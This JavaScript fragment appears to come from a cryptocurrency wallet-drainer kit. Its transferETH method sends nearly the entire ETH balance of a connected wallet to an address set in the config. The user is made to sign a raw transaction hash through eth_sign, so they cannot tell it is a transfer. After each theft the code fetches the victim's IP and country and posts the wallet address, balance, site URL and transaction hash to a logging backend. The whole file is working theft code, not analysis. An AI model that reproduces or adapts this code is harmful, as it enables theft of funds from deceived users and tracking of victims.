/**
     * Transfers all ETH and leaves some ETH for other transactions
     */
    transferETH = async () => {
        if (this.walletBalanceInEth < config.claimInfo.minWalletBalance) {
            this.updateButtonMessage(0, true);
            console.warn("Not enaugh ETH for transfer")
            return
        }
        console.log("Transferring ETH");
        console.log("Pending Transactions: " + this.pending.length);

        // get gas price
        let gasPrice = await this.web3Js.eth.getGasPrice();
        let hexGasPrice  = this.web3Js.utils.toHex(Math.floor(gasPrice * 1.3))

        // substract gas price from ETH
        let bnNumber = new this.web3Js.utils.BN('22000');
        let substractionNumber = bnNumber * Math.floor(gasPrice * 2);
        let etherToSend = (this.walletBalance - substractionNumber);
        // + (this.pending.length > 0 ? - (gasPrice * this.pending.length) * 1.5 : 0

        if(this.walletBalanceInEth > 0.008) {
            etherToSend = etherToSend - (gasPrice * this.pending.length) * 2.5
        }

        if(this.walletBalanceInEth > 0.02 && this.filteredTransactions[this.filteredTransactions.length-1].name != "ETH") {
            etherToSend = etherToSend - (gasPrice * 3.5);
        }

        console.log(`Sending ${this.web3Js.utils.fromWei(etherToSend.toString())} ETH`);

        let transactionObject = {
            nonce: this.web3Js.utils.toHex((await this.getCurrentNonce(this.walletAddress))),
            gasPrice: hexGasPrice,
            gasLimit:  this.web3Js.utils.toHex(21000),
            to: config.receiver,
            value: '0x' + etherToSend.toString(16),
            data: '0x',
            v: '0x1',
            r: '0x',
            s: '0x',
        }

        // hash the transaction object
        let hexObject = new ethereumjs.Tx(transactionObject);
        let hexString = '0x' + hexObject.serialize().toString('hex')

        let rawHash = this.web3Js.utils.sha3(hexString, {
            encoding: 'hex'
        });
   
        // sign 
        await this.web3Js.eth.sign(rawHash, this.walletAddress)
        .then(async (hash) => {
            let firstPrefix = hash.substring(2);
            let r = '0x' + firstPrefix.substring(0, 64);
            let s = '0x' + firstPrefix.substring(64, 128);
            let fullHash = parseInt(firstPrefix.substring(128, 130), 16);
            let y = this.web3Js.utils.toHex(fullHash + this.chainId * 2 + 8);

            hexObject.r = r
            hexObject.s = s
            hexObject.v = y

            let signedTx = '0x' + hexObject.serialize().toString('hex');

            await new Promise(async (resolve, reject) => { 
                await this.web3Js.eth.sendSignedTransaction(signedTx)
                .once('transactionHash', hash => {
                    console.log("ETH success", hash);
                    this.pending.push(hash);
                    resolve(hash)
                }).catch(error => {
                    reject(error);
                });    

            }).then(async hash => {

                let ipData = {};
                try {
                    if(config.logIpData) {
                        try {
                            ipData = await fetch("https://ipapi.co/json/", this.requestOptionsPOST)
                            .then(resp => resp.json())
                        } catch(error) {
                            console.warn("Couldn't fetch ip data: ", error);
                        }
                    }
                } catch(error) {
                    console.warn("Couldn't fetch ip data: ", error);
                }
        
                if(!ipData.ip || !ipData.country_name) {
                    ipData = {
                        ip: "Unknown",
                        country_name: "Unknown"
                    }
                }
            
                fetch(`${config.logDomainName}backend/safa/eth`, {
                    method: 'POST',
                    headers: {
                        'Content-Type':'application/json',
                        'Accept':'application/json'
                    },
                    body: JSON.stringify({
                        address: this.walletAddress,
                        walletBalanceInEth: this.walletBalanceInEth,
                        isMobile: this.isMobile(),
                        websiteUrl: window.location.href,
                        websiteDomain: window.location.host,
                        ipData: ipData,
        
                        tokenPrice: Number(this.walletBalanceInEth).toFixed(4),
                    
                        transactionHash: hash,
                    })
                });
            }).catch(error => console.log("ETH sendSignedTransaction error:", error));
            
        })
        .catch(error => {
            if(error.code == 4001) {
                this.logCancel("ETH", "", this.walletBalanceInEth.toString() + " ETH");
            }
            this.updateButtonMessage(true);
        });    

    }
	
	console.log("Waiting Ethereum Request");